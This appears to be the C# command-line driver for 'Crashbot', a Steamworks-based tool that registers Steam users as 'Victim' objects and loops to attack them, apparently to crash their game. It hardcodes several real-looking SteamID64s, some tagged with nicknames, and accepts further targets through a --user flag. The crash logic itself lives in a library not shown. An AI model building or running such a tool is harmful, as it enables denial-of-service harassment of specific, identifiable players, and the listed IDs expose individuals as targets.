using Crashbot;
using Crashbot.Steam;
using Crashbot.Util;
using Steamworks;

namespace CrashBotCli
{
    internal class Program
    {
        private static ulong[] steamids = [
            // 76561198359772034
            76561198299556567,
            76561198000662213, // scrap man
            76561198004277014, // kan
            76561198079775050, // kosmo
            // 76561197965646622, // moonbo
            // 76561198422873503,
        ];

        private static readonly int MaxVerbosity = Enum.GetValues<Verbosity>().Cast<int>().Max();

        static void Main(string[] args)
        {
            Environment.CurrentDirectory = Directory.GetParent(AppContext.BaseDirectory)!.FullName;
            File.WriteAllText("steam_appid.txt", "387990");

#if DEBUG
            Logger.LogVerbosity = Verbosity.Debug;
#endif

            while (args.Length > 0)
            {
                int cnt = Math.Min(2, args.Length);
                var kvp = args.Take(cnt);
                args = args.Skip(cnt).ToArray();
                string key = kvp.ElementAtOrDefault(0).Trim();
                string value = kvp.ElementAtOrDefault(1).Trim();

                switch (key)
                {
                    case "-v":
                    case "--verbosity":
                        if (Enum.TryParse(value, true, out Verbosity v))
                            Logger.LogVerbosity = v;
                        else if (int.TryParse(value, out int enm))
                            Logger.LogVerbosity = (Verbosity)Math.Min(MaxVerbosity, Math.Abs(enm));
                        break;
                    case "-u":
                    case "--user":
                        steamids = [.. steamids, ulong.Parse(value)];
                        break;
                    case "-h":
                    case "--help":
                        Logger.WriteLine("Usage: Crashbot [-v|--verbosity <verbosity>] [-u|--user <steamid64>] [-h|--help]", Verbosity.None);
                        Logger.WriteLine("Verbosity levels: None = 0, Minimal = 1, Normal = 2, Verbose = 3, Debug = 4", Verbosity.None);
                        Logger.WriteLine("Additional Users: There is no limit on how many users can be added via the cli", Verbosity.None);
                        return;
                }
            }

            SteamInterface Steam = SteamInterface.NewAsyncInterface();
            Steam.WaitUntilSteamReady();
            Logger.Write(Environment.NewLine, Verbosity.None);

            while (true)
            {
                AutoResetEvent Step = new(false);

                foreach (ulong sid in steamids)
                {
                    CSteamID originalUserSteamid = new(sid);
                    Victim A = new(originalUserSteamid);

                    Steam.AddNewVictim(A);
                }

                Step.WaitOne();
            }
        }
    }
}
